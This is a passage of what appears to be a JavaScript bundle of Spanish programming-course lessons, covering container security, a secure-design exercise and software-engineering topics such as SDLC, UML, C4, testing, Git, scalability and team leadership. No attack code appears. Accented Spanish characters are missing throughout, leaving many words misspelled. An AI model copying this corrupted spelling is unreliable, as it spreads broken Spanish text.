## 2. Docker Security
Si usas contenedores:
*   No corras como usuario \`root\`.
*   Usa imgenes base ligeras y actualizadas (ej: Alpine) para reducir la superficie de ataque.
*   Escanea tus imgenes en busca de vulnerabilidades con herramientas como \`Trivy\` o \`Snyk\`.

## 3. Vulnerability Scanning
Integra en tu Pipeline (CI/CD) herramientas que revisen tus dependencias automticamente. Si usas una librera de \`npm\` que tiene un fallo de seguridad conocido, tu despliegue debe fallar automticamente.

---

### Misin Final Senior:
La seguridad es un proceso, no un estado. Un Senior programa auditoras peridicas, revisa los logs de errores y educa al equipo sobre nuevas amenazas.

### Desafo Final:
Realiza un escaneo de seguridad a un sitio web (puedes usar herramientas online como \`Mozilla Observatory\`). Qu nota saca (A, B, C...)? Qu headers le faltan?
`,completed:!1},{id:"security-12-practica-seguridad",title:"Seguridad Avanzada",level:"senior",content:`# Ejercicios y Evaluacin: Seguridad Avanzada

Demuestra tu nivel resolviendo estos desafos de diseo y seguridad.

---

## Nivel Semi-Senior: El Flujo del Refresh Token
**Consigna:** Disea la lgica de una base de datos para manejar Refresh Tokens.
1. Qu campos necesitaras para poder invalidar una sesin especfica?
2. Escribe el pseudocdigo del endpoint \`/api/refresh\`. Qu verificaciones haces antes de dar un nuevo Access Token?

---

## Nivel Senior: Anlisis Forense
**Consigna:** Se detect que un usuario malintencionado logr entrar a la base de datos y rob la tabla de \`usuarios\`. Sin embargo, las contraseas estn hasheadas con **bcrypt + Salt**.
1. Puede el atacante entrar a las cuentas inmediatamente? Por qu?
2. Qu tcnica usara el atacante para intentar descubrir las claves reales (fuerza bruta, rainbow tables, etc.)?
3. Como Senior, qu le diras a los usuarios en el comunicado oficial y qu acciones tcnicas forzaras inmediatamente?

---

## Evaluacin Final de Seguridad
*   Cul es la diferencia tcnica entre **RBAC** y **ABAC**?
*   Explica qu es un ataque **CSRF** y cmo se previene usando SameSite Cookies.
*   En una arquitectura de Microservicios, cmo aseguras la comunicacin interna entre el "Servicio de Pagos" y el "Servicio de Usuarios"?

---

### Resultado Esperado:
Un ingeniero que no solo sabe "parchar" agujeros, sino que disea sistemas que son inherentemente seguros desde su concepcin. 
`,completed:!1,isProject:!0}]},fD={id:"software-engineering",title:"Ingeniera de Software",description:"Transforma tu mentalidad de programador a Ingeniero. Aprende a construir sistemas robustos, mantenibles y escalables en el mundo real.",completed:!1,track:"Fundamentos de Ingeniera",lessons:[{id:"se-01-fundamentos",title:"Qu es la Ingeniera de Software?",level:"junior",content:`# Leccin 1: Qu es la Ingeniera de Software?

Mucha gente escribe cdigo, pero no todos hacen **Ingeniera de Software**. La diferencia radica en la escala, la mantenibilidad y el trabajo en equipo.

## 1. Programacin vs. Ingeniera
*   **Programacin:** Escribir cdigo para que una computadora haga algo (ej: un script personal).
*   **Ingeniera de Software:** Aplicar principios sistemticos y disciplinados al desarrollo, operacin y mantenimiento del software. Es resolver problemas **reales** para **clientes reales** con restricciones (tiempo, dinero, equipo).

## 2. Los pilares de la Ingeniera
Un ingeniero se preocupa por:
1.  **Mantenibilidad:** Podr otro programador entender y modificar esto en 2 aos?
2.  **Escalabilidad:** Funcionar si pasamos de 10 a 10 millones de usuarios?
3.  **Confiabilidad:** El sistema falla elegantemente o colapsa?
4.  **Eficiencia:** Usa los recursos necesarios sin desperdicio?

## 3. El costo del cambio
El principio fundamental es que **corregir un error en la etapa de requisitos es 100 veces ms barato que corregirlo en produccin**. Por eso, un ingeniero **piensa antes de codificar**.

---

### Misin Junior:
Reflexiona sobre tu ltimo proyecto personal. Cunto tiempo dedicaste a planear antes de escribir la primera lnea de cdigo? Un Ingeniero Junior empieza a cambiar la proporcin de 90% codificar / 10% pensar a 60% codificar / 40% pensar.
`,completed:!1},{id:"se-02-ciclo-vida",title:"El Ciclo de Vida del Software (SDLC)",level:"junior",content:`# Leccin 2: Ciclo de Vida del Software (SDLC)

El desarrollo no es un acto de magia, es un proceso. **SDLC (Software Development Life Cycle)** define las fases desde la idea hasta el retiro del software.

## 1. Las Fases Clsicas
1.  **Requisitos:** Qu necesita el cliente? (La frase "No s, verlo quiero" es peligrosa).
2.  **Anlisis:** Es factible? Qu tecnologa usar?
3.  **Diseo:** Modelado de la solucin (diagramas, wireframes, arquitectura).
4.  **Implementacin:** Escribir el cdigo (Programacin).
5.  **Pruebas (Testing):** Funciona como se espera?
6.  **Despliegue (Deployment):** Enviar a produccin.
7.  **Mantenimiento:** Corregir bugs y aadir features.

## 2. Metodologas
Cmo organizamos esas fases en el tiempo.
*   **Cascada (Waterfall):** Terminas una fase entera antes de pasar a la siguiente (Lento, rgido, ideal para construccin fsica, no software).
*   **gil (Agile):** Ciclos cortos (sprints) donde entregas pequeas partes del software funcionando frecuentemente (Scrum, Kanban). **Es el estndar de la industria hoy.**

## 3. DevOps
La integracin continua de desarrollo y operaciones. Elimina el muro entre "Yo hice el cdigo" y "Yo lo despliego".

---

### Misin Junior:
Imagina que debes construir una tienda online. Describe brevemente qu haras en cada una de las 7 fases del SDLC para este proyecto. Te dars cuenta que programar es solo una parte pequea del total.
`,completed:!1},{id:"se-03-requerimientos",title:"Ingeniera de Requisitos",level:"junior",content:`# Leccin 3: Ingeniera de Requisitos

El mayor error de un desarrollador Junior es empezar a programar sin entender qu se necesita realmente. Los **requisitos** son el contrato entre el problema y la solucin.

## 1. Tipos de Requisitos
*   **Funcionales:** Lo que el sistema **debe hacer** (ej: "El usuario debe poder iniciar sesin con Google"). Son visibles para el usuario final.
*   **No Funcionales (Atributos de Calidad):** Cmo debe comportarse el sistema (ej: "La pgina debe cargar en menos de 2 segundos", "La contrasea debe estar encriptada"). Son crticos para la arquitectura.

## 2. Historias de Usuario (User Stories)
El formato gil estndar:
> "Como [rol], quiero [accin], para [beneficio]."
*   Ejemplo: "Como *cliente*, quiero *filtrar productos por precio*, para *encontrar ofertas que se ajusten a mi presupuesto*."

## 3. Criterios de Aceptacin
Las condiciones especficas para decir "esto est terminado".
*   Ejemplo para el login:
    *   Verificar email vlido.
    *   Mostrar error si la contrasea es incorrecta.
    *   Redirigir al dashboard al xito.

---

### Misin Junior:
Escribe 3 Historias de Usuario para una aplicacin de lista de tareas (To-Do List), incluyendo sus Criterios de Aceptacin. Sin esto, no sabrs cundo has terminado de programar.
`,completed:!1},{id:"se-04-documentacion",title:"Documentacin: El Mapa del Tesoro",level:"junior",content:`# Leccin 4: Documentacin Tcnica Bsica

El cdigo se lee muchas ms veces de las que se escribe. La documentacin es el mapa que dejas para tu "yo del futuro" y para tu equipo.

## 1. Niveles de Documentacin
1.  **Cdigo Auto-documentado:** Nombres de variables y funciones tan claros que no necesitan explicacin (\`getUserById\` es mejor que \`getData\`).
2.  **Comentarios en Cdigo:** Solo para explicar el **POR QU** de una lgica compleja, no el QU (eso se ve leyendo el cdigo).
3.  **Documentacin de API / Funciones:** JSDoc, Swagger. Explica inputs, outputs y posibles errores.
4.  **Documentacin de Proyecto (README):** La cara del proyecto.

## 2. El README.md perfecto
Todo repositorio debe tener uno. Estructura mnima:
*   **Ttulo y Descripcin:** Qu es esto?
*   **Instalacin:** \`npm install ...\`
*   **Uso:** Ejemplos rpidos de cmo correrlo.
*   **Contribucin:** Gua para otros devs.

## 3. Diagramas Simples
No necesitas UML complejo. Un diagrama de flujo o un diagrama de secuencia simple en una pizarra (o herramienta como Mermaid.js) vale ms que 1000 lneas de texto.

---

### Misin Junior:
Crea un \`README.md\` para tu ltimo proyecto. Imagina que un extrao lo descarga. Podra hacerlo funcionar sin preguntarte nada? Si la respuesta es no, tu documentacin fall.
`,completed:!1},{id:"se-05-uml",title:"UML: El Lenguaje Visual",level:"semi-senior",content:`# Leccin 5: UML (Unified Modeling Language) - El Lenguaje Visual de la Ingeniera

UML no es solo "dibujitos". Es el estndar *de facto* para visualizar, especificar y documentar sistemas de software. Como Semi-Senior, dejas de pensar en cdigo lineal y empiezas a pensar en **estructuras y relaciones**.

## 1. Por qu UML?
Imagina explicar la estructura de un rascacielos solo con palabras. Imposible. UML es el plano del arquitecto de software.
*   **Estandarizacin:** Un diagrama de clases se entiende igual en Japn que en Argentina.
*   **Abstraccin:** Te permite ignorar detalles de implementacin (cdigo) y centrarte en la lgica del sistema.
*   **Comunicacin:** Es mucho ms rpido discutir sobre un diagrama que leer 5000 lneas de cdigo.

## 2. Los Diagramas Esenciales
Aunque UML tiene 14 tipos de diagramas, en la prctica profesional dominamos 3 principales:

### A. Diagrama de Clases (Estructural)
El ms importante para POO. Muestra las clases, sus atributos, mtodos y **relaciones**.
*   **Herencia (Generalizacin):** Flecha con tringulo vaco (\`Estudiante --|> Persona\`).
*   **Composicin:** Rombo relleno (\`Libro *-- Pagina\`). Si el libro muere, las pginas tambin.
*   **Agregacin:** Rombo vaco (\`Curso o-- Estudiante\`). El estudiante existe sin el curso.
*   **Asociacin:** Lnea simple (\`Profesor -- Asignatura\`).

**Ejemplo de Cdigo vs UML:**
\`\`\`typescript
class Motor { ... }
class Auto {
  private motor: Motor; // Composicin
}
\`\`\`
En UML: \`Auto *--> Motor\`.

### B. Diagrama de Secuencia (Comportamiento)
Muestra cmo interactan los objetos **en el tiempo**. Vital para entender flujos complejos.
*   **Actores:** Usuario, Sistema Externo.
*   **Lneas de vida:** El tiempo fluye hacia abajo.
*   **Mensajes:** Flechas horizontales (llamadas a mtodos).
*   **Retorno:** Flecha punteada.

*Caso de Uso:* "Login de Usuario".
1. Usuario -> GUI: ingresarCredenciales()
2. GUI -> AuthController: validar()
3. AuthController -> Database: findUser()
4. Database --> AuthController: UserData
5. AuthController --> GUI: Token

### C. Diagrama de Casos de Uso (Funcional)
Muestra **qu** hace el sistema (no cmo) desde el punto de vista del usuario.
*   **Actores:** "Administrador", "Cliente".
*   **Casos de Uso:** valos ("Registrar Venta", "Generar Reporte").
*   **Relaciones:** \`<include>\` (obligatorio), \`<extend>\` (opcional).

## 3. Errores Comunes de Semi-Senior
1.  **Parlisis por Anlisis:** Intentar modelar TODO el sistema al detalle. Modela solo lo complejo o crtico.
2.  **UML como Documentacin Muerta:** Hacer diagramas que nunca se actualizan. salos para **disear antes de codificar**, o para documentar mdulos estables.
3.  **Confundir Agregacin con Composicin:** Es sutil, pero define el ciclo de vida de los objetos en memoria.

---

### Misin Semi-Senior:
Elige un mdulo de tu proyecto actual (ej: "Sistema de Notificaciones"). Dibuja un **Diagrama de Clases** simple que muestre las entidades involucradas y sus relaciones. No uses herramientas complejas todava, lpiz y papel o \`draw.io\` son suficientes. Puedes identificar dnde aplicaste herencia o composicin?
`,completed:!1},{id:"se-06-diagramas",title:"Diagramas Estructurales y C4",level:"semi-senior",content:`# Leccin 6: Diagramas Estructurales y el Modelo C4

Ms all de UML, existen modelos modernos para visualizar la arquitectura de software a diferentes niveles de abstraccin. Como Semi-Senior, debes saber comunicar tu diseo tanto a un **CEO** (alto nivel) como a un **Desarrollador Junior** (bajo nivel).

## 1. El Problema de los "Diagramas de Arquitectura"
La mayora de los diagramas de arquitectura son un desastre: cajas y flechas sin significado claro, mezclando bases de datos con clases de cdigo.
*   **Solucin:** El **Modelo C4** (Context, Containers, Components, Code).

## 2. El Modelo C4 (Simon Brown)
Es una jerarqua de diagramas, com Google Maps (Zoom In / Zoom Out).

### Nivel 1: Contexto (System Context)
*   **Audiencia:** Todos (Negocio, Dueos, Devs).
*   **Qu muestra:** Tu sistema como **una sola caja** en el centro, rodeado de los usuarios y otros sistemas con los que interacta.
*   **Ejemplo:**
    *   Centro: "Sistema de Banca Online".
    *   Alrededores: "Cliente (Usuario)", "Sistema de Mainframe (Legacy)", "Sistema de E-mail".
    *   Relaciones: "Cliente *usa* Banca", "Banca *enva correos usando* Sistema de E-mail".

### Nivel 2: Contenedores (Containers)
*   **Audiencia:** Equipo Tcnico, Arquitectos.
*   **Qu muestra:** Un "Zoom In" al sistema. Muestra las aplicaciones desplegables y bases de datos.
*   **Ejemplo:**
    *   "Single Page App (React)", "API Server (Node.js)", "Base de Datos (PostgreSQL)", "Mobile App (Flutter)".
    *   Muestra **protocolos**: "SPA *habla JSON/HTTPS* con API Server".

### Nivel 3: Componentes (Components)
*   **Audiencia:** Desarrolladores de ese contenedor especfico.
*   **Qu muestra:** "Zoom In" a un contenedor solo (ej: API Server). Muestra los mdulos lgicos o "componentes" internos.
*   **Ejemplo:** "AuthController", "AuditService", "PaymentProcessor", "UserRepository".

### Nivel 4: Cdigo (Code)
*   **Audiencia:** Implementadores.
*   **Qu muestra:** Diagramas de Clases UML del componente. (Raramente necesario si el cdigo es limpio).

## 3. Diagramas de Flujo (Flowcharts)
tiles para lgica de negocio y algoritmos, no para arquitectura.
*   **Rombos:** Decisiones (If/Else).
*   **Rectngulos:** Procesos/Acciones.
*   **Cilindros:** Datos.
*   **Uso:** Explicar un proceso de aprobacin de un prstamo complejo con mltiples condiciones.

## 4. Diagramas Entidad-Relacin (DER / ERD)
Especficos para Bases de Datos Relacionales.
*   Vital para disear el esquema de la BD antes de crear tablas.
*   Define **Cardinalidad** (1 a 1, 1 a N, N a M) y **Claves Forneas**.

---

### Misin Semi-Senior:
Dibuja el diagrama de **Nivel 1 (Contexto)** y **Nivel 2 (Contenedores)** de una aplicacin tipo "Uber".
*   Contexto: Pasajero, Conductor, Sistema Uber, Google Maps API, Pasarela de Pagos.
*   Contenedores: App Pasajero, App Conductor, API Gateway, Servicio de Viajes, Servicio de Pagos, BD Relacional, BD Geoespacial.
Entender esto es entender **Arquitectura**.
`,completed:!1},{id:"se-07-arquitectura-capas",title:"Arquitectura en Capas",level:"semi-senior",content:`# Leccin 7: Arquitectura en Capas (Layered Architecture)

El "Spaghetti Code" es el enemigo. La Arquitectura en Capas es la defensa estndar para separar responsabilidades y hacer sistemas mantenibles.

## 1. El Concepto de Separacin de Responsabilidades (SoC)
Cada parte de tu cdigo debe tener una **nica razn para cambiar**.
*   Si cambias el diseo visual (HTML/CSS), no deberas tocar las consultas SQL.
*   Si cambias de MySQL a MongoDB, no deberas reescribir la validacin de formularios.

## 2. Las Capas Clsicas (N-Tier)

### A. Capa de Presentacin (Frontend / UI / Controller)
*   **Responsabilidad:** Interactuar con el usuario (o cliente API).
*   **Qu hace:** Recibe inputs (clics, JSON), valida formatos bsicos, llama a la Capa de Negocio y muestra resultados.
*   **Qu NO hace:** Reglas de negocio complejas ni consultas directas a la BD.

### B. Capa de Negocio / Dominio (Service Layer)
*   **EL CORAZN DEL SISTEMA.**
*   **Responsabilidad:** Ejecutar la lgica de la aplicacin.
*   **Qu hace:** Validaciones de negocio ("Tiene saldo suficiente?"), clculos, coordinacin de mltiples operaciones.
*   **Agnstica:** No debe saber si est en una web, una app mvil o una consola. No debe saber si usa SQL o archivos de texto.

### C. Capa de Acceso a Datos (Persistence - Repositories/DAO)
*   **Responsabilidad:** Hablar con la base de datos o APIs externas.
*   **Qu hace:** CRUD (Create, Read, Update, Delete). Traduce objetos del dominio a filas de tabla y viceversa.
*   **Qu NO hace:** Lgica de negocio. Solo "dame el usuario con ID 5".

### D. Base de Datos / Infraestructura
*   El almacenamiento fsico real.

## 3. La Regla de Oro: Dependencia
**Las capas superiores dependen de las inferiores. NUNCA al revs.**
*    Controller importa Service.
*    Service importa Repository.
*    Repository importa Controller (Ciclo de dependencia, MAL).
*    Domain importa UI (Contaminacin de lgica, MAL).

## 4. Evolucin: Arquitectura Hexagonal (Ports & Adapters)
Una versin ms avanzada donde el "Dominio" est al centro, aislado de *todo* (UI, BD, Frameworks).
*   **Puertos:** Interfaces que definen qu necesita el dominio.
*   **Adaptadores:** Implementaciones reales (SQLAdapter, ReactAdapter).
*   Permite cambiar la BD o el Framework sin tocar una lnea de lgica de negocio.

---

### Misin Semi-Senior:
Revisa una funcin de tu backend actual. Mezcla lgica de validacin, lgica de negocio y consultas a la base de datos en un solo bloque?
Refactorzala mentalmente en 3 capas:
1.  \`UserController\`: Recibe request, valida params.
2.  \`UserService\`: Verifica reglas (ej: usuario activo), hash de password.
3.  \`UserRepository\`: \`INSERT INTO users...\`.
`,completed:!1},{id:"se-08-testing-estrategico",title:"Testing Estratgico",level:"semi-senior",content:`# Leccin 8: Testing Estratgico

El Junior prueba "haciendo clic en la app". El Semi-Senior automatiza pruebas para dormir tranquilo. Pero cuidado: **tener 100% de cobertura de cdigo no significa tener un buen software**.

## 1. La Pirmide de Testing
No todos los tests son iguales. Debes tener una estrategia equilibrada.

### Base: Unit Tests (Pruebas Unitarias) - 70%
*   **Qu:** Prueban una funcin o clase aislada.
*   **Caractersticas:** Muy rpidos (ms), baratos de escribir/mantener, muy especficos.
*   **Herramientas:** Jest, Vitest, JUnit.
*   **Ejemplo:** \`sum(2, 2)\` debe retornar \`4\`.

### Medio: Integration Tests (Pruebas de Integracin) - 20%
*   **Qu:** Prueban cmo interactan varios mdulos (ej: Service + Database).
*   **Caractersticas:** Ms lentos (requieren BD real o simulada), detectan errores de "comunicacin" entre piezas.
*   **Ejemplo:** "Al crear usuario, se guarda en BD y se enva email".

### Punta: End-to-End (E2E) - 10%
*   **Qu:** Prueban el flujo completo como un usuario real.
*   **Caractersticas:** Lentos (abren navegador real), frgiles (si cambia un botn, falla el test), caros de mantener.
*   **Herramientas:** Cypress, Playwright, Selenium.
*   **Ejemplo:** "Abrir navegador, ir a login, escribir usuario, clic entrar, verificar dashboard".

## 2. TDD (Test Driven Development)
Escribir el test **antes** que el cdigo.
1.  **Red:** Escribe test que falla (porque la funcin no existe).
2.  **Green:** Escribe el cdigo mnimo para pasar el test.
3.  **Refactor:** Mejora el cdigo sin romper el test.
*Beneficio:* Te obliga a disear APIs limpias y cdigo modular desde el principio.

## 3. Mocks vs. Stubs vs. Fakes
Para testear aisladamente, necesitas "mentirle" a tu cdigo sobre sus dependencias externas.
*   **Mock:** Objeto simulado que verifica *comportamiento* ("me asegur que se llam a la funcin \`sendEmail\`").
*   **Stub:** Objeto que devuelve datos fijos ("cuando pidas usuario 1, devuelve este JSON").
*   **Fake:** Implementacin ligera pero funcional (una base de datos en memoria en lugar de Postgres real).

## 4. Qu NO testear
*   No testes libreras de terceros (asume que React/Lodash funcionan).
*   No testes Getters/Setters triviales.
*   No testes la UI al detalle con Unit Tests (usa E2E o Snapshot testing con cuidado).

---

### Misin Semi-Senior:
Escribe un test unitario para una funcin pura simple (ej: calculadora de descuentos).
Luego, piensa en un escenario de integracin: Cmo probaras que tu API guarda datos en la base de datos sin realmente borrar tu base de datos de produccin? (Pista: Contenedores Docker efmeros o bases de datos en memoria).
`,completed:!1},{id:"se-09-gestion-versiones",title:"Gestin de Versiones",level:"semi-senior",content:`# Leccin 9: Gestin de Versiones y Git Flow

Git no es solo \`commit\` y \`push\`. Es la herramienta fundamental de colaboracin. Un mal manejo de versiones puede detener a un equipo entero.

## 1. El Problema del "Code Conflict"
Cuando 5 personas trabajan en el mismo archivo, el caos es inminente.
Como Semi-Senior, eres responsable de la **integridad de la rama principal (main/master)**.

## 2. Estrategias de Ramas (Branching Strategies)

### A. Git Flow (Clsico)
Estructura rgida y compleja.
*   \`master\`: Produccin puro.
*   \`develop\`: Integracin de features.
*   \`feature/*\`: Ramas temporales para cada tarea.
*   \`release/*\`: Preparacin para versin.
*   \`hotfix/*\`: Parches urgentes a produccin.
*   *Uso:* Proyectos legacy o con lanzamientos muy espaciados.

### B. Trunk Based Development (Moderno - Recomendado)
*   **Idea:** Todos commitean a \`main\` (trunk) todos los das o usan ramas de vida muy corta (< 1 da).
*   **Requisito:** Tests automticos robustos (CI/CD).
*   **Beneficio:** Evita el "Merge Hell" (conflictos masivos al final del mes).
*   **Feature Flags:** Si el cdigo no est listo, se oculta con una bandera en cdigo, no en una rama separada.

## 3. Versionado Semntico (SemVer)
El estndar \`MAJOR.MINOR.PATCH\` (ej: \`2.14.3\`).
*   **MAJOR (2):** Rompe compatibilidad (Breaking changes). Necesitas actualizar tu cdigo para usarla.
*   **MINOR (14):** Nueva funcionalidad, compatible hacia atrs.
*   **PATCH (3):** Correccin de bugs, compatible hacia atrs.

## 4. Pull Requests (PR) / Merge Requests
El momento clave de calidad.
*   No es solo "subir cdigo". Es una solicitud de **Revisin de Cdigo**.
*   **El Reviewer:** Busca bugs, mantenibilidad, estilo y seguridad.
*   **El Author:** Debe explicar el "Qu", "Por qu" y "Cmo" en la descripcin del PR.
*   **Regla:** Ningn PR se aprueba a s mismo.

## 5. Conventional Commits
Estandarizar los mensajes de commit para automatizar changelogs.
*   \`feat: add dark mode\` (Nueva feature)
*   \`fix: resolve login crash\` (Bug fix)
*   \`docs: update readme\` (Documentacin)
*   \`refactor: simplify user service\` (Cambio de cdigo sin cambio de comportamiento)

---

### Misin Semi-Senior:
1.  Revisa tu historial de commits (\`git log\`). Son descriptivos? Podras entender qu hiciste hace 3 meses?
2.  Adopta **Conventional Commits** desde hoy.
3.  Nunca trabajes directo en \`main\`. Crea una rama \`feature/mi-tarea\`, haz cambios, y simula un PR (Pull Request) aunque trabajes solo.
`,completed:!1},{id:"se-10-arquitectura-empresarial",title:"Arquitectura Empresarial",level:"senior",content:`# Leccin 10: Arquitectura Empresarial (Enterprise Architecture)

Como Senior, tu cdigo ya no vive en una burbuja. Vive en un ecosistema complejo de sistemas interconectados. La Arquitectura Empresarial trata sobre cmo encaja tu pieza en el rompecabezas gigante de la organizacin.

## 1. Monolito vs. Microservicios (La eterna batalla)
No hay una respuesta correcta, solo **Trade-offs**.

### Monolito Modular
*   **Qu es:** Una sola unidad de despliegue, pero bien estructurada internamente.
*   **Ventajas:** Fcil de desarrollar, testear y desplegar al inicio. Latencia cero entre mdulos.
*   **Desventajas:** Escala mal si solo una parte recibe mucho trfico. Un error tumba todo el sistema.
*   **Cundo usar:** Startups, equipos pequeos, dominios poco complejos.

### Microservicios
*   **Qu es:** Pequeos servicios autnomos que se comunican por red (HTTP/gRPC/Colas).
*   **Ventajas:** Escala independientemente. Tecnologas agnsticas (un servicio en Node, otro en Go).
*   **Desventajas:** **Complejidad Operacional brutal**. Latencia de red. Consistencia eventual. Transacciones distribuidas (Saga Pattern).
*   **Cundo usar:** Equipos masivos (+50 devs), dominios muy complejos y separados (Uber, Netflix).

## 2. Event-Driven Architecture (EDA)
Dejar de llamarnos sincrnicamente y empezar a emitir eventos.
*   **Sncrono (Request/Response):** Servicio A llama a B y espera. (Acoplamiento temporal).
*   **Asncrono (Eventos):** Servicio A grita "Pas algo!" y sigue. Servicio B, C y D escuchan y reaccionan. (Desacoplamiento).
*   **Herramientas:** Kafka, RabbitMQ, AWS SNS/SQS.

## 3. Patrones de Integracin
*   **API Gateway:** Un portero nico para tus clientes. Maneja auth, rate limiting y ruteo.
*   **BFF (Backend For Frontend):** Una API especfica para Mobile, otra para Web, optimizadas para cada cliente.

---

### Misin Senior:
Tu empresa tiene un Monolito Legacy de 10 aos. El CEO quiere "pasar a Microservicios" porque est de moda.
Tu tarea no es decir "s", es analizar.
Escribe un memo tcnico de 1 pgina explicando por qu **NO** deberan migrar todo a microservicios de golpe, proponiendo una estrategia de "Strangler Fig Pattern" (extraer servicios poco a poco) y advirtiendo sobre la complejidad de infraestructura necesaria (Kubernetes, Observabilidad).
`,completed:!1},{id:"se-11-escalabilidad",title:"Escalabilidad y Alto Rendimiento",level:"senior",content:`# Leccin 11: Escalabilidad y Alto Rendimiento

"Me funciona en localhost" es la frase ms peligrosa de un Senior. La realidad son millones de usuarios concurrentes.

## 1. Escalar hacia Arriba vs. Escalar hacia los Lados

### Escalado Vertical (Scale Up)
*   **Estrategia:** Comprar un servidor ms grande (Ms CPU, ms RAM).
*   **Lmite:** Llega un punto donde no existe una mquina ms potente o es impagable.
*   **Uso:** Bases de datos relacionales (tradicionalmente).

### Escalado Horizontal (Scale Out)
*   **Estrategia:** Agregar ms servidores pequeos.
*   **Desafo:** Tu aplicacin debe ser **Stateless** (sin estado). No puedes guardar sesiones en memoria RAM, porque el siguiente request puede ir a otro servidor.
*   **Uso:** Web Servers, APIs, Bases de datos NoSQL.

## 2. Estrategias de Base de Datos
Aqu est el cuello de botella del 90% de los sistemas.
*   **ndices:** La diferencia entre O(N) (scan completo) y O(log N). Vital.
*   **Read Replicas:** Una Master para escribir, varias Slaves solo para leer.
*   **Sharding:** Partir la base de datos en pedazos (Ej: Usuarios A-M en Server 1, N-Z en Server 2). Complejidad extrema de gestin.

## 3. Caching: El arte de no trabajar
La mejor forma de optimizar es no hacer el trabajo.
*   **Client Side:** Cache en el navegador (HTTP headers).
*   **CDN (Content Delivery Network):** Servir estticos desde el borde (edge) cerca del usuario.
*   **Application Cache:** Redis/Memcached. Guardar resultados de queries pesadas en memoria.
*   **Problema:** "Solo hay dos cosas difciles en Ciencias de la Computacin: invalidacin de cach y nombrar cosas". Qu pasa si el dato cambia en la BD pero el cach sigue viejo?

## 4. Teorema CAP
En un sistema distribuido, solo puedes tener 2 de 3:
1.  **C**onsistency (Todos ven el mismo dato al mismo tiempo).
2.  **A**vailability (El sistema siempre responde, aunque sea con datos viejos).
3.  **P**artition Tolerance (El sistema aguanta si se corta el cable de red).
*   Como la red **va** a fallar (P), debes elegir entre C y A. (CP o AP).

---

### Misin Senior:
Disea la arquitectura de datos para un sistema de "Likes" en tiempo real para un evento tipo Super Bowl (10 millones de likes por minuto).
Escribiras cada like directamente a MySQL? (Spoiler: El servidor explotara).
Propn una solucin usando colas (buffering), agregacin en memoria (Redis) y escritura asncrona a base de datos (Batching).
`,completed:!1},{id:"se-12-trade-offs",title:"Trade-offs Tcnicos",level:"senior",content:`# Leccin 12: Trade-offs Tcnicos (El "Depende")

El Junior busca "la mejor tecnologa". El Senior sabe que **no existe**. Solo hay herramientas con diferentes compromisos. Tu trabajo es elegir qu problema quieres tener.

## 1. La respuesta favorita del Senior: "Depende"
Si te preguntan "Es mejor React o Angular?", y respondes rpido, fallaste.
La respuesta correcta empieza con "Para qu contexto?".
*   Equipo experto en TypeScript y OOP? -> Angular.
*   Startup que necesita iterar rpido y contratar fcil? -> React.

## 2. Buy vs. Build (Comprar vs. Construir)
Deberamos construir nuestro propio sistema de chat o usar una API (Sendbird/Twilio)?
*   **Build:** Control total, sin coste mensual recurrente. **Costo:** Tiempo de desarrollo, mantenimiento eterno, bugs propios, distraccin del Core Business.
*   **Buy:** Rpido, robusto. **Costo:** Dinero, Vendor Lock-in (atado al proveedor), menos flexible.
*   **Regla:** Construye solo lo que es tu **Core Business** (tu ventaja competitiva). Compra todo lo dems (Auth, Pagos, Email, Chat).

## 3. Velocidad vs. Calidad
*   **Startup Fase 0:** La calidad de cdigo importa poco si nadie usa el producto. Optimiza para **velocidad de entrega**. Acepta Deuda Tcnica intencional.
*   **Empresa Consolidada:** Un bug cuesta millones. Optimiza para **estabilidad y testabilidad**.

## 4. Complexity Budget (Presupuesto de Complejidad)
Cada herramienta nueva que agregas (Redux, GraphQL, Docker, Kubernetes) tiene un costo cognitivo para el equipo.
No uses una bazuca para matar un mosquito.
*   Necesitas Kubernetes para un blog personal? No.
*   Necesitas Microservicios para 3 desarrolladores? No.

---

### Misin Senior:
Te proponen reescribir todo el Frontend de la empresa (que est en jQuery antiguo pero funciona y genera millones) a la ltima versin de React.
Analiza los Trade-offs:
*   Risks: Qu pasa si la migracin tarda 2 aos en vez de 6 meses? (The Second System Effect).
*   Benefits: Realmente venderemos ms por usar React? O solo es para que los devs estn felices?
Escribe un argumento en contra de la reescritura total ("The Big Rewrite") y propn una migracin gradual hbrida.
`,completed:!1},{id:"se-13-gestion-equipos",title:"Gestin de Equipos y Liderazgo",level:"senior",content:`# Leccin 13: Gestin de Equipos y Liderazgo Tcnico

Ser Senior no es solo escribir cdigo ms rpido. Es hacer que **todo el equipo** sea mejor. Eres un multiplicador de fuerza.

## 1. Mentoring vs. Hacerlo t mismo
Es tentador decir "Qutate, yo lo hago rpido". Eso es un fracaso de liderazgo.
*   Si lo haces t, solucionas el problema de hoy.
*   Si enseas al Junior, solucionas los problemas del prximo ao.
*   **Code Reviews:** No solo busques bugs. salos para ensear arquitectura y estilo. S emptico pero riguroso.

## 2. Delegacin Efectiva
Delegar no es "toma este ticket y arrglate".
*   **Contexto:** Explica *por qu* es importante.
*   **Restricciones:** Define los lmites (tiempo, alcance).
*   **Apoyo:** "Estar disponible si te trabas, pero intenta resolverlo".

## 3. Manejo de Conflictos Tcnicos
Dos desarrolladores discuten por 2 horas sobre usar Tabs vs. Spaces o una librera vs. otra.
*   El Senior interviene no para imponer su gusto, sino para **desbloquear**.
*   "Hagamos una prueba de concepto (POC) rpida de ambas y decidimos con datos".
*   "Disagree and Commit": Podemos no estar de acuerdo, pero una vez tomada la decisin, remamos todos juntos.

## 4. Comunicacin con No-Tcnicos
Tu habilidad ms valiosa es traducir "No podemos hacer esto porque la latencia de la base de datos es alta" a "Si hacemos esto, los usuarios esperarn 5 segundos y perderemos el 20% de las ventas".
*   Habla en trminos de **Riesgo, Dinero y Tiempo**.

---

### Misin Senior:
Tienes un desarrollador "Rockstar" en tu equipo. Escribe cdigo genial y rapidsimo, pero:
1.  No documenta nada.
2.  Trata mal a los Juniors en los Code Reviews.
3.  Su cdigo es tan complejo que solo l lo entiende.
Cmo gestionas esta situacin? Ignorarlo destruir la moral del equipo. Despedirlo perder conocimiento clave. Plantea una conversacin de feedback 1:1.
`,completed:!1},{id:"se-14-deuda-tecnica",title:"Gestin de Deuda Tcnica",level:"senior",content:`# Leccin 14: Gestin de Deuda Tcnica

La Deuda Tcnica es inevitable, como la entropa. No es mala *per se*, lo malo es no gestionarla.

## 1. Tipos de Deuda
El Cuadrante de Martin Fowler:
*   **Imprudente / Deliberada:** "No hay tiempo para tests, a produccin as". (Peligrosa).
*   **Imprudente / Inadvertida:** "No s cmo hacer arquitectura, as que hice esto". (Falta de formacin).
